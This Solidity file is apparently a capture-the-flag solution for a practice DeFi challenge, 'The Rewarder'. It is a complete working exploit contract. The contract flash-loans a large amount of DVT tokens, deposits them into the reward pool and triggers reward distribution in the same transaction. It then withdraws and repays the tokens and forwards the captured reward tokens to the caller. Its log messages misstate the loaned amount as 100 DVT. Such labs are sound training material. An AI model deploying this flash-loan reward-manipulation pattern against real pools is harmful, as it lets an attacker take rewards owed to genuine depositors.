// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract TheRewarderAttacker {
    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public theRewarderPool;
    IERC20 public rewardToken;
    IERC20 public liquidityToken;
    IERC20 public accountingToken;

    constructor(address _flashLoanerPool, address _theRewarderPool) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        rewardToken = theRewarderPool.rewardToken();
        liquidityToken = IERC20(theRewarderPool.liquidityToken());
        accountingToken = IERC20(theRewarderPool.accountingToken());
    }

    function attack() external {
        console.log("Attacking TheRewarderPool");
        // Flash loan DVT tokens
        flashLoanerPool.flashLoan(1000000 ether);

        // Transfer reward tokens to msg.sender
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("Flash loaned 100 DVT tokens");
        // Deposit DVT tokens into the pool
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        console.log("Deposited 100 DVT tokens");

        // Distrubute rewards
        theRewarderPool.distributeRewards();
        console.log("Distributed rewards");

        // Withdraw DVT tokens from the pool
        theRewarderPool.withdraw(amount);
        console.log("Withdrew 100 DVT tokens");

        // Return DVT tokens to the flash loaner pool
        liquidityToken.transfer(address(flashLoanerPool), amount);
        console.log("Returned 100 DVT tokens to the flash loaner pool");
    }

}
